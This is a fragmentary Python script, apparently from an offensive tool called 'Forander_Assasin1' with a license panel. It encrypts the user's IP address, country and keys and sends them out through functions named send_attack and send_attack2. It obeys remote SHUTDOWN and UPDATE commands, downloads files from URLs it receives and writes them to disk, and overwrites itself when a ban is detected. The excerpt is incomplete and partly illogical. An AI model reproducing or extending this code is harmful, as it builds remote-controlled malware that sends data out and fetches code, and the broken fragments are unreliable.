...
from Forander_Assasin1 import checker_login,PANEL_USE
import requests
import random
...
if log_check[0] == 'KNOWN':
   print(f"⚙️ SKIP MAKE FILES setting.txt . . .")
    ...
    if data[0] == 'FAILED':
     ...
     data_Forander = Fernet_enc.encrypt(f".. {base64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()} ....... {Fernet_enc.encrypt(f'{data[1]}.{data[2]}'.encode())} .... {Fernet_enc.encrypt(base64.b64encode(base64.standard_b64encode(key)))}".encode())
     send_attack(data_Forander)
     data_Forander_SAFE = f'ip={xff_xff_x00.decode()} country={data[1]}.{data[2]} keys={key}'
     send_attack2(data_Forander_SAFE)
...
if con_data == None:
 ...
 Forander_logs_test = data_test.replace('\r','').replace('\n','').split('#')
 if Forander_logs_test[0].upper() == 'SHUTDOWN':
    pass
 elif Forander_logs_test[0].upper() == 'UPDATE':
    if update_checker == 'True':
     files_build = FILES_MAKER(os.path.join(os.path.dirname(__file__),'setting.txt'),'R',0)
     files_build_Forander = files_build.split('@')
     if files_build_Forander[0].upper() == 'TRUE':
     ...
     print(f"[📢] ({Forander_logs_test[2].replace('https://','').replace('raw.githubusercontent.com','')}:{Forander_logs_test[1]}) WRITING . . .")
     con_data = download(Forander_logs_test[2])
     FILES_MAKER(os.path.join(os.path.dirname(__file__),Forander_logs_test[1].lower()),'WB',con_data)
    ...
    try:
        while True:
           try:
              ...
              GET_IP_Forander = GET_IP().split('|')
              if str(GET_IP_Forander[0]) == str(data[0]) or str(GET_IP_Forander[1]) == str(data[0]):
                if str(data[1]) == str(data[1]):
                   print(f'{Fore.RED}YOU GOT BANNED REASON={data[0]}{Fore.RESET}')
                   FILES_MAKER(os.path.join(os.path.dirname(__file__),'Forander_Assasin1.py'),'WB','DATA IS CLEAR BECAUSE BANNED')
